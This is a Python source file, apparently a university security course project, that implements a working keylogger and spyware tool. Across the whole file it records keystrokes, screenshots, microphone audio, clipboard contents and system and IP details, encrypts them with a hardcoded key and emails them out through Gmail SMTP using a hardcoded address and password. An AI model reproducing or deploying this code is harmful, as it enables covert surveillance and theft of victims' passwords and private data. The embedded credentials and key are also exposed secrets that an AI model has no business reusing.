# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
from requests import get
from PIL import ImageGrab
from threading import Thread
import os

# Is an arbitrary path which can be changed accordingly
filepath = 'D:\\UNSW\\Term 1 2022\\COMP6841\\Something Awesome Project\\Keylogger'
fileAccessExtension = '\\'

##################################### TIMER  ################################################################clear
timeForKeyloggerToRun = 30
currentTime = time.time()
stoppingTime = time.time() + timeForKeyloggerToRun

##################################### TIMER  ################################################################

##################################### GETTING SCREENSHOTS  ################################################################
screenshotInfo = 'screenshot.png'

def screenshot():
    image  = ImageGrab.grab()
    image.save(filepath + fileAccessExtension + screenshotInfo)


##################################### GETTING SCREENSHOTS  ################################################################


##################################### GETTING MICROPHONE INFO  ################################################################

microhponeTime = 5
audioFile = 'audio.wav'

def microphone():
    fs = 44100
    recording = sd.rec(int(microhponeTime * fs), samplerate=fs, channels=2)
    sd.wait()

    write(filepath + fileAccessExtension + audioFile, fs, recording)


##################################### GETTING MICROPHONE INFO  ################################################################


##################################### GETTING CLIPBOARD INFO  ################################################################

clipboardInfo = 'clipboardInfo.txt'

def copy_clipboard():
    with open(filepath + fileAccessExtension + clipboardInfo, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            clipboardData = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write('Clipboard Info: \n' + clipboardData)
        except:
            f.write('Could not get clipboard info')


##################################### GETTING CLIPBOARD INFO  ################################################################


##################################### GETTING COMPUTER INFO  ################################################################

systemInfo = 'systemInfo.txt'

def getComputerInfo():
    with open(filepath + fileAccessExtension + systemInfo, 'a') as f:
        hostname = socket.gethostname()
        ipAddress = socket.gethostbyname(hostname)
        try:
            publicIP = get('https://api.ipify.org').text
            f.write('Public IP: ' + publicIP)
        except Exception:
            f.write('Cannot access the public IP address from API')

        f.write('Processor info: ' + platform.processor() + '\n')
        f.write('System info: ' + platform.system() + ' ' + platform.version() + '\n')
        f.write('Machine info: ' + platform.machine() + '\n')
        f.write('Hostname info: ' + hostname + '\n')
        f.write('Private IP Address: ' + ipAddress + '\n')

##################################### GETTING COMPUTER INFO  ################################################################


##################################### EMAIL SENDING  ################################################################

emailAddress = 'bbllhhbbllhh@gmail.com'
password = 'bb11hhbb11hh'

toSend = 'bbllhhbbllhh@gmail.com'

def sendEmail(filename, keyLogFile, toSend, realFileName):
    emailFrom = emailAddress
    msg = MIMEMultipart()
    msg['From'] = emailAddress
    msg['To'] = toSend
    msg['Subject'] = realFileName
    keyLogFile = open((keyLogFile), 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((keyLogFile.read()))
    encoders.encode_base64(p)
    p.add_header('Content Disposition', 'attachment filename= filename')
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(emailAddress, password)
    text = msg.as_string()
    s.sendmail(emailAddress, toSend, text)
    s.quit()

# sendEmail(keyInfo, filepath + fileAccessExtension + keyInfo, toSend)

##################################### EMAIL SENDING  ################################################################


##################################### ENCRYPTION  ################################################################

def sendEncryptedData():
    keyInfoEncrypted = 'sys1.txt'
    sysInfoEncrypted = 'sys2.txt'
    clipboardInfoEncrypted = 'sys3.txt'
    key = 'Blnqc9FN5l-aORHYCkm3bFih2jOOXr1if6b-z3J-Ohg='

    filesToEncrypt = [filepath +fileAccessExtension + keyInfo, filepath +fileAccessExtension + systemInfo, filepath +fileAccessExtension + clipboardInfo]
    encryptedFiles = [filepath +fileAccessExtension + keyInfoEncrypted, filepath +fileAccessExtension + sysInfoEncrypted, filepath +fileAccessExtension + clipboardInfoEncrypted]
    tempCount = 0

    while tempCount < len(filesToEncrypt):
        with open(filesToEncrypt[tempCount], 'rb') as f:
            data = f.read()
        fernet = Fernet(key)
        encryptedData = fernet.encrypt(data)

        with open(encryptedFiles[tempCount], 'wb') as f:
            f.write(encryptedData)

        sendEmail(encryptedFiles[tempCount], encryptedFiles[tempCount], toSend, filesToEncrypt[tempCount])

        tempCount += 1

    sendEmail(audioFile, filepath + fileAccessExtension + audioFile, toSend, audioFile)
    sendEmail(screenshotInfo, filepath + fileAccessExtension + screenshotInfo, toSend, screenshotInfo)
    # with open(filepath + fileAccessExtension + keyInfo, 'w') as f:
    #     f.write(" ")
    time.sleep(10)

    # delete_files = [systemInfo, clipboardInfo, keyInfo, screenshotInfo, audioFile]
    # for file in delete_files:
    #     os.remove(filepath +fileAccessExtension + file)

##################################### ENCRYPTION  ################################################################

##################################### KEY LOGGING  ################################################################

keyInfo = 'keyInfoLog.txt'

count = 0
keys = []

def onKeyPressed(key):
    global keys, count, currentTime
    print(key)
    keys.append(key)
    count += 1
    currentTime = time.time()

    if count >= 1:
        count = 0
        writeToFile(keys)
        keys = []


def writeToFile(keys):
    with open(filepath + fileAccessExtension + keyInfo, 'a') as f:
        for key in keys:
            tempKey = str(key).replace("'", "")
            if tempKey.find("space") > 0:
                f.write('\n')
                f.close()
            elif tempKey.find('Key') == -1:
                f.write(tempKey)
                f.close()


def onKeyReleased(key):
    if key == Key.esc:
        return False



def listen():
    with Listener(on_press=onKeyPressed, on_release=onKeyReleased) as listener:
        listener.join()

Thread(target=listen).start()

while True:
    if currentTime > stoppingTime:
        #     sendEmail(keyInfo, filepath + fileAccessExtension + keyInfo, toSend)
        #
        microphone()
        screenshot()
        #     sendEmail(screenshotInfo, filepath + fileAccessExtension + screenshotInfo, toSend)
        #
        getComputerInfo()
        #     sendEmail(systemInfo, filepath + fileAccessExtension + systemInfo, toSend)
        #
        copy_clipboard()
        #     sendEmail(clipboardInfo, filepath + fileAccessExtension + clipboardInfo, toSend)
        #
        sendEncryptedData()
        currentTime = time.time()
        stoppingTime = time.time() + timeForKeyloggerToRun

##################################### KEY LOGGING  ################################################################